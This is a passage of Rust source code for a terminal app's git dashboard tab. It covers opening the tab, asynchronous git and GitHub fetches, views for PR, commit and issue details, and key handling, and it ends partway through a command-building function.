//! The **git tab** (docs/17, GIT-1): open/close, async local-git fetch, and the
//! key handlers for the dashboard. A git tab carries a placeholder `TileLayout`
//! leaf (no pane is spawned), so every existing `layout()` path keeps working;
//! render/input branch on `Tab::is_git()`.

use std::path::PathBuf;

use super::*;
use crate::git::{
    filtered_branches, filtered_commits, filtered_issues, filtered_prs, github, local, GhState,
    GitPayload, GitView, Load, Scope, Section, StateFilter,
};

impl App {
    /// Open (or focus) the git tab for `workspace`. Idempotent — one git tab per workspace.
    ///
    /// `Workspace.cwd` is fixed at workspace creation and never follows a
    /// pane's live shell `cd` (see `App::refresh_cwds`). A user who just `cd`s
    /// into a repo inside a pane, instead of opening a dedicated workspace
    /// there, got a silent no-op from `Ctrl+Space g`: the check ran against
    /// the stale workspace root, correctly saw "not a repo", and stopped
    /// (issue/67). So when the workspace root itself isn't a repo, fall back
    /// to the now-active workspace's focused pane's actual live cwd before
    /// giving up.
    pub fn open_git_tab(&mut self, wsi: usize) {
        if wsi >= self.workspaces.len() {
            return;
        }
        self.active_ws = wsi;
        if let Some(i) = self.workspaces[wsi].tabs.iter().position(Tab::is_git) {
            self.workspaces[wsi].active_tab = i;
            return;
        }
        let ws_root = self.workspaces[wsi].cwd.clone();
        let mut root = ws_root.clone();
        let mut check = local::repo_check(&root);
        // Only fall back on an ordinary "not a repo" root. A workspace-root
        // `Error` (broken `git`, bad `PATH`, ...) must still surface as a
        // toast, even when the focused pane happens to be a valid repo.
        if matches!(check, local::RepoCheck::NotRepo) {
            let pane_cwd = self.focused_cwd();
            if pane_cwd != ws_root {
                let pane_check = local::repo_check(&pane_cwd);
                match pane_check {
                    local::RepoCheck::Repo => {
                        root = pane_cwd;
                        check = pane_check;
                    }
                    // The pane cwd itself failed to check (bad permissions, a
                    // broken `git`, ...): that's worth surfacing even if the
                    // workspace root was just an ordinary non-repo folder.
                    local::RepoCheck::Error(_) => check = pane_check,
                    local::RepoCheck::NotRepo => {}
                }
            }
        }
        match check {
            local::RepoCheck::Repo => {}
            // A workspace that genuinely isn't a git repo stays a silent
            // no-op (the common case, e.g. a scratch folder).
            local::RepoCheck::NotRepo => return,
            // `git` missing or failing to run is surfaced instead of
            // swallowed, so `Ctrl+Space g` never again looks like it did
            // nothing (issue/67).
            local::RepoCheck::Error(e) => {
                self.show_toast(format!("git tab: {e}"));
                return;
            }
        }
        let view = GitView::new(root.clone());
        let view_id = view.id;
        let placeholder = PaneId::alloc(); // never inserted into `panes`
        let ws = &mut self.workspaces[wsi];
        ws.tabs.push(Tab {
            layout: TileLayout::new(placeholder),
            git: Some(Box::new(view)),
            orch: false,
            mission: false,
            name: None,
        });
        ws.active_tab = ws.tabs.len() - 1;
        self.zoomed = false;
        self.session_dirty = true;
        self.git_fetch(view_id, root, Scope::ThisRepo, StateFilter::Open);
    }

    /// Open the git tab for the currently active workspace.
    pub fn open_git_tab_active(&mut self) {
        self.open_git_tab(self.active_ws);
    }

    pub fn active_git(&self) -> Option<&GitView> {
        let ws = self.workspaces.get(self.active_ws)?;
        ws.tabs.get(ws.active_tab)?.git.as_deref()
    }

    pub fn active_git_mut(&mut self) -> Option<&mut GitView> {
        let at = self.workspaces.get(self.active_ws)?.active_tab;
        self.workspaces
            .get_mut(self.active_ws)?
            .tabs
            .get_mut(at)?
            .git
            .as_deref_mut()
    }

    pub fn active_is_git(&self) -> bool {
        self.active_git().is_some()
    }

    /// Apply an async fetch result to whichever git tab owns `view_id`. A status
    /// result also refreshes that workspace's sidebar ahead/behind badge.
    pub fn git_data(&mut self, view_id: u64, payload: GitPayload) {
        let badge = match &payload {
            GitPayload::Status(Ok(s)) => Some((s.ahead, s.behind)),
            _ => None,
        };
        for wi in 0..self.workspaces.len() {
            for ti in 0..self.workspaces[wi].tabs.len() {
                if let Some(g) = self.workspaces[wi].tabs[ti].git.as_deref_mut() {
                    if g.id == view_id {
                        // Bell on a PR's checks newly turning red (the agent-first
                        // payoff: code with Claude, get pinged when CI fails).
                        let mut alerts = Vec::new();
                        if let GitPayload::Prs(Ok(new)) = &payload {
                            for pr in new {
                                let was = g.prev_pr_checks.get(&pr.number).copied();
                                if pr.checks == crate::git::Checks::Failing
                                    && was.is_some_and(|w| w != crate::git::Checks::Failing)
                                {
                                    alerts.push(format!("PR #{} checks failed", pr.number));
                                }
                            }
                            g.prev_pr_checks = new.iter().map(|p| (p.number, p.checks)).collect();
                        }
                        g.apply(payload);
                        if let Some(ab) = badge {
                            self.workspaces[wi].git_ahead_behind = Some(ab);
                        }
                        self.pending_notify.extend(alerts);
                        return;
                    }
                }
            }
        }
    }

    /// Kick off the async fetch for every open git tab. Called after a session
    /// restore so restored git tabs load their data (docs/17).
    pub fn refetch_git_tabs(&mut self) {
        let targets: Vec<(u64, PathBuf, Scope, StateFilter)> = self
            .workspaces
            .iter()
            .flat_map(|ws| {
                ws.tabs.iter().filter_map(|t| {
                    t.git
                        .as_ref()
                        .map(|g| (g.id, g.repo_root.clone(), g.scope, g.state_filter))
                })
            })
            .collect();
        for (id, root, scope, state) in targets {
            self.git_fetch(id, root, scope, state);
        }
    }

    /// Run the local-git fetches + GitHub (per `scope`/`state`) on a detached thread.
    fn git_fetch(&self, view_id: u64, root: PathBuf, scope: Scope, state: StateFilter) {
        let tx = self.app_tx.clone();
        std::thread::spawn(move || {
            let send = |p: GitPayload| {
                let _ = tx.send(AppEvent::GitData {
                    view: view_id,
                    payload: p,
                });
            };
            send(GitPayload::Status(local::status(&root)));
            send(GitPayload::Branches(local::branches(&root)));
            send(GitPayload::Commits(local::commits(&root, 100, false)));
            send(GitPayload::Info(local::repo_info(&root)));
            // GitHub data (GIT-2/5) — only if `gh` is installed + authenticated.
            let gh = github::detect();
            send(GitPayload::Gh(gh));
            if gh == GhState::Ready {
                send(GitPayload::Prs(github::pull_requests(&root, scope, state)));
                send(GitPayload::Issues(github::issues(&root, scope, state)));
            }
        });
    }

    pub fn git_refresh(&mut self) {
        if let Some(g) = self.active_git_mut() {
            let (id, root, scope, state) = (g.id, g.repo_root.clone(), g.scope, g.state_filter);
            g.status = Load::Loading;
            g.info = Load::Loading;
            g.branches = Load::Loading;
            g.commits = Load::Loading;
            g.prs = Load::Idle;
            g.issues = Load::Idle;
            self.git_fetch(id, root, scope, state);
        }
    }

    // ── PR detail panel (GIT-6) ───────────────────────────────────────────────

    /// The PR number under the cursor in the PRs list (only in that section).
    fn git_selected_pr(&self) -> Option<u64> {
        let g = self.active_git()?;
        if g.section != Section::Prs {
            return None;
        }
        match &g.prs {
            Load::Loaded(v) => filtered_prs(v, &g.filter).nth(g.cursor).map(|p| p.number),
            _ => None,
        }
    }

    /// Fetch full detail for `number` and show the detail panel.
    fn fetch_pr_detail(&mut self, number: u64) {
        let Some(g) = self.active_git() else {
            return;
        };
        let (id, root) = (g.id, g.repo_root.clone());
        if let Some(g) = self.active_git_mut() {
            g.open_pr = Some(number);
            g.detail = Load::Loading;
            g.scroll = 0;
        }
        let tx = self.app_tx.clone();
        std::thread::spawn(move || {
            let _ = tx.send(AppEvent::GitData {
                view: id,
                payload: GitPayload::PrDetail(Box::new(github::pr_detail(&root, number))),
            });
        });
    }

    /// `⏎` on a PR row: open the detail panel for it.
    fn git_open_pr_detail(&mut self) {
        if let Some(n) = self.git_selected_pr() {
            self.fetch_pr_detail(n);
        }
    }

    /// `r` inside the panel: re-fetch the open PR.
    fn git_refresh_detail(&mut self) {
        if let Some(n) = self.active_git().and_then(|g| g.open_pr) {
            self.fetch_pr_detail(n);
        }
    }

    /// Close the PR detail panel (back to the list).
    fn git_close_pr_detail(&mut self) {
        if let Some(g) = self.active_git_mut() {
            g.open_pr = None;
            g.detail = Load::Idle;
            g.scroll = 0;
        }
    }

    /// A PR action (run in the workspace's terminal pane so the user sees output and
    /// can answer any prompt — `gh pr merge` is interactive, which is the safe
    /// "confirm before merging" path).
    fn pr_action(&mut self, kind: &str) {
        let Some(n) = self.active_git().and_then(|g| g.open_pr) else {
            return;
        };
        let cmd = match kind {
            "checkout" => format!("gh pr checkout {n}"),
            "diff" => format!("gh pr diff {n}"),
            "merge" => format!("gh pr merge {n}"),
            "approve" => format!("gh pr review {n} --approve"),
            "ready" => format!("gh pr ready {n}"),
            _ => return,
        };
        self.git_run_in_pane(cmd);
    }

    /// `o` inside the panel: open the PR on GitHub.
    fn pr_detail_web(&self) {
        let Some(g) = self.active_git() else {
            return;
        };
        let Some(n) = g.open_pr else {
            return;
        };
        let root = g.repo_root.clone();
        std::thread::spawn(move || {
            let _ = github::view_web(&root, "pr", n);
        });
    }

    /// Key handling while the PR detail panel is open.
    fn handle_pr_detail_key(&mut self, key: KeyEvent) {
        match key.code {
            KeyCode::Esc | KeyCode::Char('q') => self.git_close_pr_detail(),
            KeyCode::Char('j') | KeyCode::Down => self.git_scroll(1),
            KeyCode::Char('k') | KeyCode::Up => self.git_scroll(-1),
            KeyCode::Char('r') => self.git_refresh_detail(),
            KeyCode::Char('o') => self.pr_detail_web(),
            KeyCode::Char('d') => self.pr_action("diff"),
            KeyCode::Char('c') | KeyCode::Enter => self.pr_action("checkout"),
            KeyCode::Char('M') => self.pr_action("merge"),
            KeyCode::Char('a') => self.pr_action("approve"),
            KeyCode::Char('R') => self.pr_action("ready"),
            _ => {}
        }
    }

    // ── commit detail view (docs/17): `git show` in-tab, not in a pane ────────

    /// The short sha under the cursor in the Commits list (only in that section).
    fn git_selected_sha(&self) -> Option<String> {
        let g = self.active_git()?;
        if g.section != Section::Commits {
            return None;
        }
        match &g.commits {
            Load::Loaded(v) => filtered_commits(v, &g.filter)
                .nth(g.cursor)
                .map(|c| c.sha.clone()),
            _ => None,
        }
    }

    /// Fetch `git show <sha>` on a thread and show the in-tab detail view. The
    /// whole point of the git tab: read a commit without spawning a pane or
    /// handing it to an agent, and `esc` back to the list.
    fn fetch_commit_detail(&mut self, sha: String) {
        let Some(g) = self.active_git() else {
            return;
        };
        let (id, root) = (g.id, g.repo_root.clone());
        if let Some(g) = self.active_git_mut() {
            g.open_commit = Some(sha.clone());
            g.commit_detail = Load::Loading;
            g.scroll = 0;
        }
        let tx = self.app_tx.clone();
        std::thread::spawn(move || {
            let _ = tx.send(AppEvent::GitData {
                view: id,
                payload: GitPayload::CommitDetail(Box::new(local::commit_show(&root, &sha))),
            });
        });
    }

    /// `⏎`/click on a commit row: open its `git show` detail in-tab.
    fn git_open_commit_detail(&mut self) {
        if let Some(sha) = self.git_selected_sha() {
            self.fetch_commit_detail(sha);
        }
    }

    /// Close the commit detail (back to the list).
    fn git_close_commit_detail(&mut self) {
        if let Some(g) = self.active_git_mut() {
            g.open_commit = None;
            g.commit_detail = Load::Idle;
            g.scroll = 0;
        }
    }

    /// Keys while the commit detail is open: `esc`/`q` back, `j`/`k` scroll,
    /// `o` open the commit on GitHub.
    fn handle_commit_detail_key(&mut self, key: KeyEvent) {
        match key.code {
            KeyCode::Esc | KeyCode::Char('q') => self.git_close_commit_detail(),
            KeyCode::Char('j') | KeyCode::Down => self.git_scroll(1),
            KeyCode::Char('k') | KeyCode::Up => self.git_scroll(-1),
            KeyCode::PageUp => {
                let page = self
                    .active_git()
                    .map(|g| g.list_area.height.saturating_sub(1) as i32)
                    .unwrap_or(20);
                self.git_scroll(-page);
            }
            KeyCode::PageDown => {
                let page = self
                    .active_git()
                    .map(|g| g.list_area.height.saturating_sub(1) as i32)
                    .unwrap_or(20);
                self.git_scroll(page);
            }
            KeyCode::Char('g') | KeyCode::Home => {
                if let Some(g) = self.active_git_mut() {
                    g.scroll = 0;
                }
            }
            KeyCode::Char('G') | KeyCode::End => {
                if let Some(g) = self.active_git_mut() {
                    g.scroll = usize::MAX; // clamped in render
                }
            }
            KeyCode::Char('o') => self.commit_open_web(),
            _ => {}
        }
    }

    /// `o` in the commit detail: open the commit's page on GitHub. Only meaningful
    /// with a GitHub remote (`gh` ready); otherwise a toast says so.
    fn commit_open_web(&mut self) {
        let Some(g) = self.active_git() else {
            return;
        };
        if g.gh != GhState::Ready {
            self.show_toast("no GitHub remote for this repo");
            return;
        }
        let Some(sha) = g.open_commit.clone() else {
            return;
        };
        let root = g.repo_root.clone();
        std::thread::spawn(move || {
            let _ = github::browse_commit(&root, &sha);
        });
    }

    /// The file path at the viewport center in the Status section, if it lands
    /// on a staged or unstaged file row. Falls back to the first available file.
    fn git_status_selected_file(&self) -> Option<(String, bool)> {
        let g = self.active_git()?;
        if g.section != Section::Status {
            return None;
        }
        // Prefer the row at the viewport center.
        let center = g.scroll + g.list_area.height as usize / 2;
        if g.status_unstaged_rows.contains(&center) {
            let idx = center - g.status_unstaged_rows.start;
            if let Load::Loaded(s) = &g.status {
                if let Some(fc) = s.unstaged.get(idx) {
                    return Some((fc.path.clone(), false));
                }
            }
        }
        if g.status_staged_rows.contains(&center) {
            let idx = center - g.status_staged_rows.start;
            if let Load::Loaded(s) = &g.status {
                if let Some(fc) = s.staged.get(idx) {
                    return Some((fc.path.clone(), true));
                }
            }
        }
        // Fallback: first unstaged, then staged.
        if let Load::Loaded(s) = &g.status {
            if !s.unstaged.is_empty() {
                return Some((s.unstaged[0].path.clone(), false));
            }
            if !s.staged.is_empty() {
                return Some((s.staged[0].path.clone(), true));
            }
        }
        None
    }

    /// Whether a click at `(col, row)` lands on a staged or unstaged file row
    /// in the Status section. Returns `(path, staged)` if so.
    pub fn git_status_file_at(&self, col: u16, row: u16) -> Option<(String, bool)> {
        let g = self.active_git()?;
        if g.section != Section::Status {
            return None;
        }
        let la = g.list_area;
        if la.height == 0 || col < la.x || col >= la.right() || row < la.y || row >= la.bottom() {
            return None;
        }
        let idx = g.scroll + (row - la.y) as usize;
        if let Load::Loaded(s) = &g.status {
            // Check unstaged first (more common action).
            if g.status_unstaged_rows.contains(&idx) {
                let i = idx - g.status_unstaged_rows.start;
                if let Some(fc) = s.unstaged.get(i) {
                    return Some((fc.path.clone(), false));
                }
            }
            if g.status_staged_rows.contains(&idx) {
                let i = idx - g.status_staged_rows.start;
                if let Some(fc) = s.staged.get(i) {
                    return Some((fc.path.clone(), true));
                }
            }
        }
        None
    }

    // ── issue detail view (docs/17): mirrors the PR detail, in-tab ────────────

    /// The issue number under the cursor in the Issues list (only that section).
    fn git_selected_issue(&self) -> Option<u64> {
        let g = self.active_git()?;
        if g.section != Section::Issues {
            return None;
        }
        match &g.issues {
            Load::Loaded(v) => filtered_issues(v, &g.filter)
                .nth(g.cursor)
                .map(|i| i.number),
            _ => None,
        }
    }

    /// Fetch full detail for `number` and show the in-tab issue detail.
    fn fetch_issue_detail(&mut self, number: u64) {
        let Some(g) = self.active_git() else {
            return;
        };
        let (id, root) = (g.id, g.repo_root.clone());
        if let Some(g) = self.active_git_mut() {
            g.open_issue = Some(number);
            g.issue_detail = Load::Loading;
            g.scroll = 0;
        }
        let tx = self.app_tx.clone();
        std::thread::spawn(move || {
            let _ = tx.send(AppEvent::GitData {
                view: id,
                payload: GitPayload::IssueDetail(Box::new(github::issue_detail(&root, number))),
            });
        });
    }

    /// `⏎`/click on an issue row: open its detail in-tab.
    fn git_open_issue_detail(&mut self) {
        if let Some(n) = self.git_selected_issue() {
            self.fetch_issue_detail(n);
        }
    }

    /// Close the issue detail (back to the list).
    fn git_close_issue_detail(&mut self) {
        if let Some(g) = self.active_git_mut() {
            g.open_issue = None;
            g.issue_detail = Load::Idle;
            g.scroll = 0;
        }
    }

    /// `o` in the issue detail: open the issue on GitHub.
    fn issue_detail_web(&self) {
        let Some(g) = self.active_git() else {
            return;
        };
        let Some(n) = g.open_issue else {
            return;
        };
        let root = g.repo_root.clone();
        std::thread::spawn(move || {
            let _ = github::view_web(&root, "issue", n);
        });
    }

    /// Keys while the issue detail is open: `esc`/`q` back, `j`/`k` scroll, `o` web.
    fn handle_issue_detail_key(&mut self, key: KeyEvent) {
        match key.code {
            KeyCode::Esc | KeyCode::Char('q') => self.git_close_issue_detail(),
            KeyCode::Char('j') | KeyCode::Down => self.git_scroll(1),
            KeyCode::Char('k') | KeyCode::Up => self.git_scroll(-1),
            KeyCode::PageUp => {
                let page = self
                    .active_git()
                    .map(|g| g.list_area.height.saturating_sub(1) as i32)
                    .unwrap_or(20);
                self.git_scroll(-page);
            }
            KeyCode::PageDown => {
                let page = self
                    .active_git()
                    .map(|g| g.list_area.height.saturating_sub(1) as i32)
                    .unwrap_or(20);
                self.git_scroll(page);
            }
            KeyCode::Char('g') | KeyCode::Home => {
                if let Some(g) = self.active_git_mut() {
                    g.scroll = 0;
                }
            }
            KeyCode::Char('G') | KeyCode::End => {
                if let Some(g) = self.active_git_mut() {
                    g.scroll = usize::MAX;
                }
            }
            KeyCode::Char('o') => self.issue_detail_web(),
            _ => {}
        }
    }

    /// `s`: cycle the PR/Issue state filter and re-fetch. PRs cycle open → closed
    /// → merged → all; issues skip merged.
    fn git_toggle_state(&mut self) {
        let is_prs = self.active_git().map(|g| g.section) == Some(Section::Prs);
        if let Some(g) = self.active_git_mut() {
            g.state_filter = g.state_filter.next(is_prs);
            g.cursor = 0;
        }
        self.git_refresh();
    }

    /// Switch the active git tab to a clicked view-selector section. Also closes
    /// any open detail view (PR, commit, issue, file diff), so a tab click
    /// always lands on a list.
    pub fn git_click_section(&mut self, section: Section) {
        if let Some(g) = self.active_git_mut() {
            let had_detail =
                g.open_pr.is_some() || g.open_commit.is_some() || g.open_issue.is_some();
            g.open_pr = None;
            g.detail = Load::Idle;
            g.open_commit = None;
            g.commit_detail = Load::Idle;
            g.open_issue = None;
            g.issue_detail = Load::Idle;
            if g.section != section || had_detail {
                g.section = section;
                g.cursor = 0;
                g.scroll = 0;
            }
        }
    }

    /// The list-row index at screen `(col, row)`, if the click lands on a row of
    /// the current cursor list (Commits / PRs / Issues / Branches), no detail is
    /// open, and we're not filtering. Uses the list body rect recorded at render
    /// and the same scroll math as `draw_list`.
    pub fn git_list_row_at(&self, col: u16, row: u16) -> Option<usize> {
        let g = self.active_git()?;
        let is_list = matches!(
            g.section,
            Section::Commits | Section::Prs | Section::Issues | Section::Branches
        );
        let detail_open = g.open_pr.is_some() || g.open_commit.is_some() || g.open_issue.is_some();
        if !is_list || detail_open || g.filtering {
            return None;
        }
        let la = g.list_area;
        if la.height == 0 || col < la.x || col >= la.right() || row < la.y || row >= la.bottom() {
            return None;
        }
        let len = self.git_list_len();
        if len == 0 {
            return None;
        }
        let avail = la.height as usize;
        let cursor = g.cursor.min(len - 1);
        // draw_list keeps the cursor on screen: first visible row = this scroll.
        let scroll = cursor.saturating_sub(avail.saturating_sub(1));
        let idx = scroll + (row - la.y) as usize;
        (idx < len).then_some(idx)
    }

    /// A click on list row `idx`: select it, then open its detail — commit `git
    /// show`, PR panel, or issue detail. A branch row only selects (no surprise
    /// checkout on a click).
    pub fn git_click_row(&mut self, idx: usize) {
        if let Some(g) = self.active_git_mut() {
            g.cursor = idx;
        }
        match self.active_git().map(|g| g.section) {
            Some(Section::Commits) => self.git_open_commit_detail(),
            Some(Section::Prs) => self.git_open_pr_detail(),
            Some(Section::Issues) => self.git_open_issue_detail(),
            _ => {}
        }
    }

    /// `x`: show/hide contributor emails in the Status view. Hidden by default —
    /// the list answers "who builds this", not "how do I mail them", and the
    /// reclaimed width goes to the name column.
    pub fn git_toggle_emails(&mut self) {
        if let Some(g) = self.active_git_mut() {
            if g.section == Section::Status {
                g.show_emails = !g.show_emails;
            }
        }
    }

    /// Expand/collapse the Status view's contributor list (`E`, or a click on its
    /// "show more" row). Collapsed hides authors under `CONTRIB_MIN_COMMITS`;
    /// expanded shows everyone, so nobody is permanently hidden.
    pub fn git_toggle_contributors(&mut self) {
        if let Some(g) = self.active_git_mut() {
            if g.section == Section::Status {
                g.contributors_expanded = !g.contributors_expanded;
            }
        }
    }

    /// `m`: toggle PR/issue scope (this repo ↔ my work) and re-fetch (GIT-5).
    fn git_toggle_scope(&mut self) {
        if let Some(g) = self.active_git_mut() {
            g.scope = g.scope.toggle();
            g.cursor = 0;
        }
        self.git_refresh();
    }

    /// Close the active git tab (no real panes to clean up).
    pub fn close_git_tab(&mut self) {
        let at = self.ws().active_tab;
        if self.ws().tabs.get(at).is_some_and(Tab::is_git) {
            let ws = &mut self.workspaces[self.active_ws];
            ws.tabs.remove(at);
            if ws.tabs.is_empty() {
                self.close_active_ws();
            } else if ws.active_tab >= ws.tabs.len() {
                ws.active_tab = ws.tabs.len() - 1;
            }
            self.session_dirty = true;
        }
    }

    /// Key handling while a git tab is focused.
    pub fn handle_git_key(&mut self, key: KeyEvent) {
        // Filter-input sub-mode.
        if let Some(g) = self.active_git_mut() {
            if g.filtering {
                match key.code {
                    KeyCode::Esc => {
                        g.filtering = false;
                        g.filter.clear();
                    }
                    KeyCode::Enter => g.filtering = false,
                    KeyCode::Backspace => {
                        g.filter.pop();
                    }
                    KeyCode::Char(c) => g.filter.push(c),
                    _ => {}
                }
                g.cursor = 0;
                return;
            }
        }
        // The PR detail panel captures keys while open.
        if self.active_git().is_some_and(|g| g.open_pr.is_some()) {
            self.handle_pr_detail_key(key);
            return;
        }
        // The commit detail view captures keys while open (docs/17).
        if self.active_git().is_some_and(|g| g.open_commit.is_some()) {
            self.handle_commit_detail_key(key);
            return;
        }
        // The issue detail view captures keys while open (docs/17).
        if self.active_git().is_some_and(|g| g.open_issue.is_some()) {
            self.handle_issue_detail_key(key);
            return;
        }
        match key.code {
            KeyCode::Char('j') | KeyCode::Down => self.git_scroll(1),
            KeyCode::Char('k') | KeyCode::Up => self.git_scroll(-1),
            KeyCode::Char('g') | KeyCode::Home => self.git_set_cursor(0),
            KeyCode::Char('G') | KeyCode::End => self.git_set_cursor(usize::MAX),
            KeyCode::Tab | KeyCode::Right => self.git_switch(true),
            KeyCode::BackTab | KeyCode::Left => self.git_switch(false),
            KeyCode::Char(c @ '1'..='6') => self.git_set_section(c as usize - '1' as usize),
            KeyCode::Char('/') => {
                if let Some(g) = self.active_git_mut() {
                    g.filtering = true;
                    g.filter.clear();
                }
            }
            KeyCode::Char('r') => self.git_refresh(),
            KeyCode::Char('o') => self.git_open_web(),
            KeyCode::Char('d') => self.git_diff(),
            KeyCode::Char('m') => self.git_toggle_scope(),
            // Status view: `x` reveals contributor emails (hidden by default),
            // `E` expands the contributor list to every author.
            KeyCode::Char('x') => self.git_toggle_emails(),
            KeyCode::Char('E') => self.git_toggle_contributors(),
            // `s` cycles the open/closed/all filter (PRs + Issues).
            KeyCode::Char('s') => self.git_toggle_state(),
            KeyCode::Char('c') => self.git_run_in_pane("gh pr create".to_string()),
            KeyCode::Enter => self.git_activate(),
            KeyCode::Esc | KeyCode::Char('q') => self.close_git_tab(),
            _ => {}
        }
    }

    /// Run `cmd` in the workspace's first terminal pane (GIT-3): switch to a pane tab,
    /// focus a pane, and feed it the command so the user sees its output and can
    /// handle any prompt or dirty-tree refusal.
    fn git_run_in_pane(&mut self, cmd: String) {
        let wsi = self.active_ws;
        // A real terminal tab — not the git tab and not the orch board (both are
        // placeholder-leaf tabs with no pane). Landing on the orch board was the
        // "it just opens the orch tab" bug.
        let Some(ti) = self.workspaces[wsi]
            .tabs
            .iter()
            .position(|t| !t.is_git() && !t.is_orch())
        else {
            self.show_toast("no terminal pane to run in");
            return;
        };
        self.workspaces[wsi].active_tab = ti;
        let focus = self.layout().focus;
        if let Some(p) = self.panes.get(&focus) {
            p.send(cmd.as_bytes());
            p.send(b"\r");
        }
    }

    /// `o`: open the selected PR/issue on GitHub (background; no blocking).
    fn git_open_web(&self) {
        let Some(g) = self.active_git() else {
            return;
        };
        let target = match g.section {
            Section::Prs => match &g.prs {
                Load::Loaded(v) => filtered_prs(v, &g.filter)
                    .nth(g.cursor)
                    .map(|p| ("pr", p.number)),
                _ => None,
            },
            Section::Issues => match &g.issues {
                Load::Loaded(v) => filtered_issues(v, &g.filter)
                    .nth(g.cursor)
                    .map(|i| ("issue", i.number)),
                _ => None,
            },
            _ => None,
        };
        if let Some((kind, num)) = target {
            let root = g.repo_root.clone();
            std::thread::spawn(move || {
                let _ = github::view_web(&root, kind, num);
            });
        }
    }

    /// Whether the active section is a cursor-selectable list (vs Flow/Status,
    /// which scroll as a block).
    fn git_section_uses_cursor(&self) -> bool {
        matches!(
            self.active_git().map(|g| g.section),
            Some(Section::Commits | Section::Branches | Section::Prs | Section::Issues)
        )
    }

    /// Scroll the active view by `delta` rows — moves the cursor in list views,
    /// or the scroll offset in Flow/Status (clamped to content during render).
    /// Drives both `j`/`k` and the mouse wheel.
    pub fn git_scroll(&mut self, delta: i32) {
        // The PR / commit / issue / file-diff detail views all scroll as a block.
        if self.active_git().is_some_and(|g| {
            g.open_pr.is_some() || g.open_commit.is_some() || g.open_issue.is_some()
        }) {
            if let Some(g) = self.active_git_mut() {
                g.scroll = (g.scroll as i64 + delta as i64).max(0) as usize;
            }
            return;
        }
        if self.git_section_uses_cursor() {
            self.git_move(delta);
        } else if let Some(g) = self.active_git_mut() {
            g.scroll = (g.scroll as i64 + delta as i64).max(0) as usize;
        }
    }

    fn git_move(&mut self, delta: i32) {
        let max = self.git_list_len().saturating_sub(1);
        if let Some(g) = self.active_git_mut() {
            g.cursor = (g.cursor as i64 + delta as i64).clamp(0, max as i64) as usize;
        }
    }

    fn git_set_cursor(&mut self, pos: usize) {
        let max = self.git_list_len().saturating_sub(1);
        let uses_cursor = self.git_section_uses_cursor();
        if let Some(g) = self.active_git_mut() {
            if uses_cursor {
                g.cursor = pos.min(max);
            } else {
                // Flow/Status: top (0) or bottom (usize::MAX, clamped in render).
                g.scroll = if pos == 0 { 0 } else { usize::MAX };
            }
        }
    }

    fn git_switch(&mut self, fwd: bool) {
        if let Some(g) = self.active_git_mut() {
            g.section = if fwd {
                g.section.next()
            } else {
                g.section.prev()
            };
            g.cursor = 0;
            g.scroll = 0;
        }
    }

    fn git_set_section(&mut self, i: usize) {
        if let Some(g) = self.active_git_mut() {
            g.section = Section::from_index(i);
            g.cursor = 0;
            g.scroll = 0;
        }
    }

    /// Selectable row count in the current section (for cursor clamping). Keeps
    /// the filter in sync with what the renderer shows.
    fn git_list_len(&self) -> usize {
        let Some(g) = self.active_git() else {
            return 0;
        };
        match g.section {
            Section::Prs => match &g.prs {
                Load::Loaded(v) => filtered_prs(v, &g.filter).count(),
                _ => 0,
            },
            Section::Issues => match &g.issues {
                Load::Loaded(v) => filtered_issues(v, &g.filter).count(),
                _ => 0,
            },
            Section::Branches => match &g.branches {
                Load::Loaded(v) => filtered_branches(v, &g.filter).count(),
                _ => 0,
            },
            Section::Commits => match &g.commits {
                Load::Loaded(v) => filtered_commits(v, &g.filter).count(),
                _ => 0,
            },
            Section::Flow | Section::Status => 0,
        }
    }

    /// `⏎` context action: PR → checkout, branch → switch, commit → show,
    /// issue → view. Branch checkout is direct (fast + refresh); the rest run in
    /// the workspace's terminal pane (GIT-3).
    fn git_activate(&mut self) {
        // A PR row opens the rich detail panel (GIT-6).
        if self.active_git().map(|g| g.section) == Some(Section::Prs) {
            self.git_open_pr_detail();
            return;
        }
        // A commit row opens its `git show` in-tab (docs/17) — not in a pane.
        if self.active_git().map(|g| g.section) == Some(Section::Commits) {
            self.git_open_commit_detail();
            return;
        }
        // An issue row opens its detail in-tab (docs/17) — not in a pane.
        if self.active_git().map(|g| g.section) == Some(Section::Issues) {
            self.git_open_issue_detail();
            return;
        }
        // A Status file row opens its diff in the native diff viewer.
        if self.active_git().map(|g| g.section) == Some(Section::Status) {
            self.git_open_status_diff();
            return;
        }
        // Branch checkout is handled directly so we can refresh in place.
        let branch = self.active_git().and_then(|g| match g.section {
            Section::Branches => match &g.branches {
                Load::Loaded(v) => filtered_branches(v, &g.filter)
                    .nth(g.cursor)
                    .map(|b| (g.repo_root.clone(), b.name.clone())),
                _ => None,
            },
            _ => None,
        });
        if let Some((root, branch)) = branch {
            let _ = local::checkout(&root, &branch);
            self.git_refresh();
            return;
        }
        if let Some(cmd) = self.git_selected_command(false) {
            self.git_run_in_pane(cmd);
        }
    }

    /// `d`: diff/show the selection in the workspace's terminal pane, or in the
    /// native diff viewer for Status files.
    fn git_diff(&mut self) {
        // Status files open in the native diff viewer.
        if self
            .active_git()
            .is_some_and(|g| g.section == Section::Status)
        {
            self.git_open_status_diff();
            return;
        }
        if let Some(cmd) = self.git_selected_command(true) {
            self.git_run_in_pane(cmd);
        }
    }

    /// Open the selected Status file in the native diff viewer. Ensures the
    /// diff snapshot is loaded first; if not, triggers a refresh and shows a
    /// toast so the user can retry. When `override_file` is `None`, uses the
    /// viewport-center file from `git_status_selected_file`.
    pub fn git_open_status_diff_with(&mut self, override_file: Option<(String, bool)>) {
        let Some((path, staged)) = override_file.or_else(|| self.git_status_selected_file()) else {
            return;
        };
        if !self.diff_snapshot_matches_active_workspace() {
            self.refresh_diff_status(true);
            self.show_toast("loading diff data — try again");
            return;
        }
        let layer = if staged {
            crate::diff::DiffLayer::Staged
        } else {
            crate::diff::DiffLayer::Worktree
        };
        match self.diff_file_for_path(&path, Some(&layer)) {
            Ok(file) => {
                self.open_diff_view(file.key, super::files::OpenTarget::Preview);
            }
            Err(e) => {
                self.show_toast(&e);
            }
        }
    }

    /// Open the viewport-center Status file in the native diff viewer.
    fn git_open_status_diff(&mut self) {
        self.git_open_status_diff_with(None);
    }

    /// The `gh`/`git` command for the selected row. `diff` chooses the diff form.
    fn git_selected_command(&self, diff: bool) -> Option<String> {
        let g = self.active_git()?;
        match g.section {
            Section::Prs => {
                let n = match &g.prs {
                    Load::Loaded(v) => filtered_prs(v, &g.filter).nth(g.cursor)?.number,
                    _ => return None,
                };
                Some(if diff {
                    format!("gh pr diff {n}")
                } else {
                    format!("gh pr checkout {n}")
                })
            }
            Section::Issues => {
                let n = match &g.issues {
